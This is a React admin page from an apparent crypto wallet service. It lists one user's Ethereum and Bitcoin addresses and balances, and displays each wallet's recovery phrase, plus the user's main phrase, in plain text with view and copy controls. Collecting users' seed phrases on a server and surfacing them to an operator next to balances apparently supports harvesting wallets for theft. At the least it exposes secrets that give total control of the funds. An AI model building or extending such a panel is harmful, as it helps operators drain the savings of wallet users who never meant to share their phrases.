import toast from "react-hot-toast";
import type { Column } from "../../components/CommonTable";
import CommonTable from "../../components/CommonTable";
import { useLocation } from "react-router-dom";
import { useEffect, useState } from "react";
import { FiSearch, FiEye, FiEyeOff } from "react-icons/fi";
import { getAdminUsers, updateUserName } from "../../adminapi/adminUsers";
interface OtherAccount {
  id: number;
  label: string | null;
  eth_address: string;
  btc_address: string;
  eth_balance: number;
  btc_balance: number;
  phrase: string;
}

interface User {
  id: number;
  ethAddress: string;
  btcAddress: string;
  ethBalance: string;
  btcBalance: string;
  phrase: string;
}

function InnerUsers() {
  const location = useLocation();
  const mainPhrase = location.state?.phrase || "";
  const [showPhrase, setShowPhrase] = useState(false);
  const userId = location.state?.userId;
const [userName, setUserName] = useState(
  localStorage.getItem(`user_name_${userId}`) ||
  location.state?.name ||
  ""
);

const [name, setName] = useState(
  localStorage.getItem(`user_name_${userId}`) ||
  location.state?.name ||
  ""
);
  const [showNameModal, setShowNameModal] = useState(false);
  const [saving, setSaving] = useState(false);
  const [users, setUsers] = useState<User[]>([]);
  const [search, setSearch] = useState("");
  const truncateAddress = (address: string) => {
    return `${address.slice(0, 6)}.....${address.slice(-5)}`;
  };
  const [showPhraseModal, setShowPhraseModal] = useState(false);
  const [selectedPhrase, setSelectedPhrase] = useState("");
  const handleCopy = async (text: string) => {
    try {
      await navigator.clipboard.writeText(text);
      toast.success("Copied!");
    } catch {
      toast.error("Failed to copy");
    }
  };

  const fetchUser = async () => {
  const res = await getAdminUsers();

  const user = res.data.users.find(
    (u) => u.id === userId
  );

  if (user) {
    setUserName(user.name || "");
    setName(user.name || "");
  }
};

useEffect(() => {
  fetchUser();
}, []);

  useEffect(() => {
    const accounts: OtherAccount[] = location.state?.accounts || [];
    const mappedUsers: User[] = accounts.map((acc) => ({
      id: acc.id,
      ethAddress: acc.eth_address,
      btcAddress: acc.btc_address,
      ethBalance: `${acc.eth_balance} ETH`,
      btcBalance: `${acc.btc_balance} BTC`,
      phrase: acc.phrase || "",
    }));

    setUsers(mappedUsers);
  }, [location.state]);
  const filteredUsers = users.filter(
    (user) =>
      user.ethAddress.toLowerCase().includes(search.toLowerCase()) ||
      user.btcAddress.toLowerCase().includes(search.toLowerCase()),
  );
  const columns: Column<User>[] = [
    {
      header: "ETH Address",
      accessor: (row) => (
        <span
          onClick={() => handleCopy(row.ethAddress)}
          className="cursor-pointer hover:text-[#25C866]"
          title="Click to copy"
        >
          {truncateAddress(row.ethAddress)}
        </span>
      ),
    },
    {
      header: "BTC Address",
      accessor: (row) => (
        <span
          onClick={() => handleCopy(row.btcAddress)}
          className="cursor-pointer hover:text-[#25C866]"
          title="Click to copy"
        >
          {truncateAddress(row.btcAddress)}
        </span>
      ),
    },
    {
      header: "ETH Balance",
      accessor: "ethBalance",
    },
    {
      header: "BTC Balance",
      accessor: "btcBalance",
    },
    {
      header: "Phrase",
      accessor: (row) => (
        <button
          onClick={() => {
            setSelectedPhrase(row.phrase);
            setShowPhraseModal(true);
          }}
          className="px-3 py-1.5 rounded-lg bg-[#25C866]/10 text-[#25C866] border border-[#25C866]/20 hover:bg-[#25C866]/20 hover:scale-105 transition-all duration-200 cursor-pointer text-sm font-medium"
        >
          View Phrase
        </button>
      ),
    },
  ];

  const handleSaveName = async () => {
  try {
    setSaving(true);

    const res = await updateUserName(userId, name);

    toast.success(res.message || "Name updated");

    setUserName(name);

    localStorage.setItem(`user_name_${userId}`, name);

    setShowNameModal(false);
  } catch (err: any) {
    toast.error(err.message || "Failed");
  } finally {
    setSaving(false);
  }
};

  return (
    <>
      <div>
        <div className="bg-[#13213A] border border-[#24324D] rounded-lg overflow-hidden">
          <div className="flex justify-between items-center p-5 border-b border-[#24324D] flex-wrap gap-4">
            <div>
              <h3 className="text-white text-lg font-semibold">User Wallets</h3>
            </div>

            <div className="flex items-center gap-3 flex-wrap">
              <button
                onClick={() => setShowNameModal(true)}
                className="px-4 py-2 bg-[#25C866] hover:bg-[#25C866]/90 rounded-lg text-sm font-medium text-white cursor-pointer whitespace-nowrap"
              >
                {name ? "Update Name" : "Add Name"}
              </button>
              <div className="relative">
                <FiSearch className="absolute left-3 top-2.5 text-gray-400" />

                <input
                  type="search"
                  placeholder="Search wallet..."
                  onChange={(e) => setSearch(e.target.value)}
                  className="pl-9 pr-4 py-2 text-sm bg-[#15243D] border border-[#24324D] rounded-lg text-gray-300 placeholder-gray-500 focus:outline-none"
                />
              </div>
            </div>
          </div>
          <div className="p-5 border-b border-[#24324D]">
            <div className="inline-flex items-center mb-3">
              <span className="text-gray-400 text-base mr-2">Name :</span>

              <span className="text-white text-base font-medium">
                {userName || "-"}
              </span>
            </div>
            <label className="block text-base text-gray-400 mb-2">
              Recovery Phrase
            </label>

            <div className="relative w-full max-w-[800px] rounded-lg border border-[#24324D] bg-[#15243D] pl-2 py-2 pr-12">
              <p className="text-sm text-white break-words whitespace-pre-wrap">
                {showPhrase
                  ? mainPhrase
                  : "• ".repeat(mainPhrase.split(" ").length)}
              </p>

              <button
                type="button"
                onClick={() => setShowPhrase(!showPhrase)}
                className="absolute right-4 top-2 text-gray-400 hover:text-white cursor-pointer"
              >
                {showPhrase ? <FiEyeOff size={16} /> : <FiEye size={16} />}
              </button>
            </div>
          </div>
          {/* Table */}
          {users.length > 0 ? (
            <CommonTable columns={columns} data={filteredUsers} />
          ) : (
            <div className="p-10 text-center text-gray-400">No Data found</div>
          )}
        </div>
        {showPhraseModal && (
          <div className="fixed inset-0 z-[999] flex items-center justify-center">
            <div
              className="absolute inset-0 bg-black/50"
              onClick={() => setShowPhraseModal(false)}
            />

            <div className="relative bg-[#161F37] p-5 rounded-xl max-w-lg w-full  mx-3">
              <h3 className="text-white text-lg font-semibold mb-4">
                Recovery Phrase
              </h3>

              <p className="text-white break-words">{selectedPhrase}</p>

              <button
                onClick={() => handleCopy(selectedPhrase)}
                className="mt-4 bg-[#25C866] px-4 py-2 rounded-lg text-white cursor-pointer"
              >
                Copy
              </button>
            </div>
          </div>
        )}
      </div>
      {showNameModal && (
        <div className="fixed inset-0 z-[999] flex items-center justify-center px-4">
          <div
            className="absolute inset-0 bg-black/50"
            onClick={() => setShowNameModal(false)}
          />

          <div className="relative bg-[#161F37] border border-[#24324D] rounded-2xl p-6 w-full max-w-md">
            <h3 className="text-white text-xl font-semibold mb-5">
              {name ? "Update Name" : "Add Name"}
            </h3>

            <input
              value={name}
              onChange={(e) => setName(e.target.value)}
              placeholder="Enter Name"
              className="w-full h-11 px-4 rounded-lg bg-[#15243D] border border-[#24324D] text-white placeholder-gray-500 focus:outline-none"
            />

            <div className="flex justify-end gap-3 mt-6">
              <button
                onClick={() => setShowNameModal(false)}
                className="px-5 py-2 border border-[#24324D] rounded-lg text-white cursor-pointer"
              >
                Cancel
              </button>

              <button
                onClick={handleSaveName}
                disabled={saving}
                className="px-5 py-2 bg-[#25C866] rounded-lg text-white cursor-pointer disabled:opacity-70"
              >
                {saving ? "Saving..." : "Save"}
              </button>
            </div>
          </div>
        </div>
      )}
    </>
  );
}

export default InnerUsers;
